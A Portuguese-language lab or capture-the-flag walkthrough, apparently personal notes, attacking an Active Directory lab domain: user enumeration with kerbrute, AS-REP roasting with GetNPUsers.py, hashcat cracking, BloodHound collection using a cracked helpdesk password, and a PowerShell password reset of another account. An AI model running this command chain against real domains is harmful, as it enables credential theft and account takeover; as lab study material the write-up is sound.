

Vamos rodar o enum4linux, como eu estava no Mac, eu rodei o Kali pela VM

`docker run --it --rm "kalilinux/kali-rolling:latest"`

`apt update && apt install enum4linux iputils-ping`

![[Pasted image 20250821212150.png]]


Vamos enumerar os usuarios a partir dessa wordlist -> https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/refs/heads/master/userlist.txt


`kerbrute userenum -dc DOMAIN_CONTROLLER -d DOMINIO LISTA_USUARIOS -t THREADS`

![[Pasted image 20250821212559.png]]

![[Pasted image 20250821212744.png]]


Como temos uma lista de usuários, agora podemos ir em busca do TGT

`GetNPUsers.py -dc-ip 172.16.13.186 papercompany.uhclabs/guest -request -no-pass`

![[Pasted image 20250821213423.png]]

Agora com a hash em mãos, vamos quebrar ela usando o hashcat

`hashcat -m 18200 hash.txt $WORDLIST/rockyou.txt -a 0 --force`

![[Pasted image 20250821213941.png]]

![[Pasted image 20250821214000.png]]

Com a senha quebrada, agora vamos rodar o `enum4linux` de forma autenticada

![[Pasted image 20250821214031.png]]

![[Pasted image 20250821214052.png]]

Agora podemos pegar a shell no usuario

![[Pasted image 20250821214447.png]]


Vamos rodar o bloodhound e pegar informações sobre como seguir com o nosso ataque...

Com o comando a seguir, vamos rodar o bloodhound e pegar as informações necessarias para ownar essa máquina...

`nxc ldap 172.16.13.186 -u 'helpdesk' -p '1qaz@WSX' --bloodhound -c All --dns-server 172.16.13.186`


![[Pasted image 20250821215020.png]]




Podemos mudar a senha do usuário utilizando do comando a seguir

```import-module ActiveDirectory```

```Set-ADAccountPassword -Identity marcos.pereira -NewPassword (ConvertTo-SecureString -AsPlainText "qwert@12345" -Force)```



